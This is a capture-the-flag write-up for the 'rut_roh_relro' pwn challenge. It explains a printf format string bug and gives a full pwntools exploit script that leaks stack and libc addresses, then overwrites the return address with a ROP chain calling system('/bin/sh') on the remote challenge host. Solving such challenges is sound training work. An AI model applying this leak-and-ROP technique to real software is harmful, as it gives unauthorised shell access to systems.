+++
authors = ["laozi"]
title = "pwn/rut_roh_relro"
date = "2023-02-12"
+++

### The challenge

This was a printf format string vulnerability. The program gets your input
then calls `printf()` on that input. Then it repeats that again. The relro
and PIE are what make this more difficult than the rick-roll challenge. Instead
of exploiting the GOT (which is read-only). You can read the address of libc as
well as the return address on the stack, then you can use the format string write
in order to create a ROP chain that just calls `system('/bin/sh')`.

```python
#!/usr/bin/env python3
from pwn import *
elf = ELF("./rut_roh_relro_patched")
libc = ELF("./libc.so.6")
ld = ELF("./libc-2.31.so")
context.terminal = ['tmux', 'splitw', '-h']
context.binary = elf
debug_script = '''
'''
def conn():
    if not args.REMOTE:
        p = process([elf.path])
        if args.D:
            gdb.attach(p, gdbscript=debug_script)
    else:
        p = remote("lac.tf", 31134)
    return p
p = conn()
p.recv()
payload = "%62$p %3$p "
p.sendline(payload)
p.recvline()
b = p.recv()
x = b.split(b' ')
addr1 = int(x[0],16)
addr2 = int(x[1],16)
ret_addr = addr1 + 33
libc.address = addr2 - 968755
writes = {ret_addr:libc.address+0x23796,
          ret_addr+8:next(libc.search(b'/bin/sh')),
          ret_addr+16:libc.symbols['system']}
payload = fmtstr_payload(6, writes, numbwritten=0)
p.sendline(payload)
p.interactive()
```
